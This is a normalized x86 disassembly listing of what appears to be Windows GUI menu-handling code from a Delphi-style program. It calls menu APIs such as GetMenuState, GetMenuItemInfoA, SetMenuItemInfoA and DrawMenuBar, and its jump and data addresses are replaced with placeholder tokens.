mov edx esi
mov eax ebx
call sub_44c584
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_404374
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407a28
push ebp
mov eax [ ebp - 0x2c ]
call sub_44cf20
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_44cf20
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c23c
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_403eec
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44c584
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_44c584
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_44ef98
mov edx [ ebp - 0x40 ]
pop eax
call sub_403ea8
mov edx esi
mov eax ebx
call sub_44c584
push eax
mov edx esi
mov eax ebx
call sub_44c584
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_404114
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_404374
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_44cfd4
mov eax [ ebp - 0x18 ]
call sub_404114
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_4043b4
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_4043fc
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_44cfd4
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_44d630
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_44c574
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_44c574
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44d7b4
test al al
je r-xdata
mov eax esi
call sub_44c574
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_44c584
call sub_44d60c
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_44c584
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_44c584
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_44c584
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_44c584
call sub_44d60c
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_44c584
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44c584
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44c584
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_44c584
call sub_44d60c
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_44d788
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_44d788
and eax 0x7f
mov al [ eax + rw-data ]
sub_44d7b4
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_44d7b4
and eax 0x7f
mov al [ eax + rw-data ]
sub_44d7e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44a4c8
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_419854
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_44e50c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_44d87c
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403104
mov eax [ esi + 0x44 ]
call sub_403104
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4198a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_44d8f0
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_44d8f0
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44a034
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_44c978
mov eax ebx
pop esi
pop ebx
retn
sub_44d930
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_44c574
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_44c584
call sub_44d930
pop ecx
test al al
je r-xdata
sub_44d9c8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_44d930
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44a034
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_44d9f8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_44d9c8
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_44ed1c
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_44da68
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_44d9c8
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_44da84
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_44d9c8
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_44d134
mov ebx eax
xor edx edx
mov eax edi
call sub_44d630
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_44ca9c
mov eax [ esi + 0x34 ]
call sub_44ca9c
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_44a9d8
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_440b28
push eax
call DrawMenuBar
sub_44db70
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_44db70
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push j_sub_4035a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_44d9c8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_44ca9c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_44db60
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_44dcc4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4242b4
xor eax eax
push ebp
push sub_44ddc2
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4242b4
xor eax eax
push ebp
push sub_44dd97
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_44db70
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4242ac
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ddc9
mov eax [ rw-data ]
call sub_4242ac
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_44d9c8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_44dde8
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_44e16c
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_44e16c
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_44dea4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_44e440
mov eax ebx
call sub_40851c
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_44df44
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_44dea4
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_4040c4
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_404314
lea edx [ ebp - 0x200 ]
call sub_4085e0
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_44dfd8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_44e048
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44e4e8
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44e4e8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_44e4e8
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_44e054
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_44df44
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_44dfd8
mov eax ebx
call sub_44e50c
jmp r-xdata
sub_44e0bc
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_44e104
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_448334
mov eax ebx
call sub_44d918
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_448378
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_419924
sub_44e140
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_419b70
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_44e104
sub_44e184
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_44d9c8
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_44d9c8
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_451470
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_44e1e0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_44e2b5
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_44d9c8
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_44d9c8
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_44c574
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44c584
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_40403c
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_40403c
mov eax [ ebp - 0xc ]
pop edx
call sub_407c08
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_44f02c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e2bc
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403e78
retn
sub_44e2c8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_44e184
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_44e1e0
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_44e440
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_44db4c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_44d9c8
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_44d9c8
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_4085c0
mov eax [ ebp + 0x10 ]
call sub_408504
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_44e50c
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_4371d8
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_44e4e8
mov [ ebx + 0x41 ] 0x1
sub_44e534
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_44e4e8
mov [ ebx + 0x41 ] 0x1
